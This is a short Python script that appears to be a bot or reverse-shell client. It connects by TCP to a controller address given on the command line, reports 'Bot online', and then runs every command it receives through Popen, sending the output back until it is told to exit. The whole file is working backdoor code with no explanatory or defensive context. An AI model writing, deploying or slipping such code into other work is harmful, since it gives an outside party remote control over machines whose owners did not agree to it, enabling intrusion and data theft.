import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1]
serverPort = 8000
clientSocket = socket(AF_INET, SOCK_STREAM) #create IPv4(AF_INET) and TCPSocket(Sock_Stream)
clientSocket.connect((serverName, serverPort))
clientSocket.send("Bot online".encode())
command = clientSocket.recv(1024).decode()
while command != "exit":
        proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
        result, err = proc.communicate()
        clientSocket.send(result)
        command = (clientSocket.recv(1024)).decode()
clientSocket.close()